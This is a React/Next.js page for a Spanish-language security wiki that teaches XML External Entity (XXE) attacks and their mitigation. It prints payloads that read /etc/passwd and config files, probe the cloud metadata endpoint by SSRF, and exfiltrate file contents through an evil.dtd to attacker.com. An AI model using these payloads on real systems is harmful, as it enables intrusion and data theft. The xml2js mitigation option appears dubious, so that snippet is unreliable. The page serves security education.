'use client';

import Link from 'next/link';
import { useParams } from 'next/navigation';
import { Home, AlertTriangle, FileCode } from 'lucide-react';

export default function XXEPage() {
  const params = useParams();
  const locale = params.locale as string;

  return (
    <div className="min-h-screen">
      <div className="bg-white dark:bg-slate-900/50 border-b border-slate-200 dark:border-slate-700 px-8 py-4">
        <div className="max-w-5xl mx-auto flex items-center gap-2 text-sm">
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors flex items-center gap-1">
            <Home className="w-4 h-4" />Wiki</Link>
          <span className="text-slate-600">/</span>
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors">Vulnerabilidades</Link>
          <span className="text-slate-600">/</span>
          <span className="text-white dark:text-white">XXE</span>
        </div>
      </div>

      <div className="bg-gradient-to-r from-orange-600 via-red-600 to-pink-600 px-8 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="flex items-center gap-3 mb-4">
            <div className="px-3 py-1 bg-yellow-500/20 text-yellow-700 dark:text-yellow-300 rounded-lg text-sm font-medium border border-yellow-500/30">Intermedio</div>
            <div className="px-3 py-1 bg-orange-500/30 text-orange-200 rounded-lg text-sm font-medium border border-orange-400/40">CVSS 7.5 - Alto</div>
            <div className="px-3 py-1 bg-white/10 backdrop-blur-sm text-slate-900 dark:text-white rounded-lg text-sm">25 min</div>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-4">
            <FileCode className="w-12 h-12" />XML External Entity (XXE)</h1>
          <p className="text-xl text-orange-100">Explotación de parsers XML para leer archivos y ejecutar código</p>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-8 py-12">
        <div className="prose prose-invert prose-lg max-w-none">
          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">¿Qué es XXE?</h2>
            <p className="text-slate-700 dark:text-slate-300 mb-6">
              XXE es una vulnerabilidad en aplicaciones que parsean XML permitiendo a un atacante definir entidades externas 
              para leer archivos locales, hacer SSRF, o causar DoS.
            </p>
            
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6 mb-6">
              <h3 className="text-xl font-semibold text-red-600 dark:text-red-400 mb-3">Payload Básico</h3>
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-red-600 dark:text-red-400">
{`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- Parser vulnerable leerá /etc/passwd y lo insertará en <name> -->`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Tipos de Ataques XXE</h2>
            <div className="space-y-4">
              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">1. File Disclosure</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">2. SSRF (Server-Side Request Forgery)</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">3. Blind XXE (Out-of-Band)</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- evil.dtd en servidor atacante -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;`}
                  </pre>
                </div>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Mitigación</h2>
            <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
              <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">Deshabilitar Entidades Externas</h3>
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-green-600 dark:text-green-400">
{`// Node.js (xml2js)
const xml2js = require('xml2js');
const parser = new xml2js.Parser({
  explicitArray: false,
  xmlns: false,
  // ✅ Deshabilitar entidades externas
  external_entities: false
});

// libxml (PHP)
libxml_disable_entity_loader(true);

// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)`}
                </pre>
              </div>
            </div>
          </section>

          <div className="bg-gradient-to-r from-orange-600/20 to-red-600/20 border border-orange-500/30 rounded-xl p-8 text-center">
            <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente</h3>
            <Link href={`/${locale}/wiki/vulnerabilidades/command-injection`}
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 text-slate-900 dark:text-white rounded-xl font-semibold transition-all">
              Command Injection<span>→</span></Link>
          </div>
        </div>
      </div>
    </div>
  );
}
